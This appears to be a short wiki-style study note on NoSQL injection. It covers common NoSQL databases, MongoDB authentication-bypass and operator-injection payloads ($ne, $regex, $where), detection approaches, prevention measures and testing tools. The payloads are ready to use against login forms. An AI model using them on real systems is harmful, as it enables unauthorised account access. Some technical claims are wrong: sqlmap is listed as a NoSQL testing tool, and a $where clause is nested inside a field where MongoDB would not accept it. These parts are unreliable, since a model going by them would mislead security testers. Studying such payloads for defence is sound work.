# NoSQL Injection

## Overview
NoSQL injection is a vulnerability that allows attackers to manipulate NoSQL database queries by injecting malicious code into user input fields. Unlike traditional SQL injection, NoSQL databases use different query languages and structures.

## Common NoSQL Databases
- **MongoDB** - Document-based database
- **CouchDB** - Document-oriented database  
- **Redis** - Key-value store
- **Cassandra** - Wide-column store
- **Neo4j** - Graph database

## Attack Vectors

### MongoDB Injection
```javascript
// Vulnerable query
db.users.find({username: userInput, password: passInput})

// Malicious payload
username: {$ne: null}
password: {$ne: null}
```

### Authentication Bypass
```javascript
// URL encoded payload
username[$ne]=&password[$ne]=

// JSON payload
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### Operator Injection
```javascript
// $where operator injection
{"username": "admin", "password": {"$where": "return true"}}

// $regex operator
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

## Detection Techniques
- **Error-based**: Trigger database errors to identify NoSQL usage
- **Boolean-based**: Use logical operators to infer data
- **Time-based**: Inject time delays to confirm injection
- **Union-based**: Extract data using NoSQL-specific operators

## Prevention
1. **Input Validation**: Validate and sanitize all user inputs
2. **Parameterized Queries**: Use proper query builders
3. **Least Privilege**: Limit database user permissions
4. **Rate Limiting**: Prevent brute force attempts
5. **WAF Rules**: Implement Web Application Firewall protection

## Tools
- [[Burpsuite]] - Manual testing with proxy
- [[sqlmap]] - Automated NoSQL injection testing
- [[NoSQLMap]] - Specialized NoSQL injection tool

## Related Topics
- [[SQL Injection]]
- [[Burpsuite]]
- [[Web application security]]
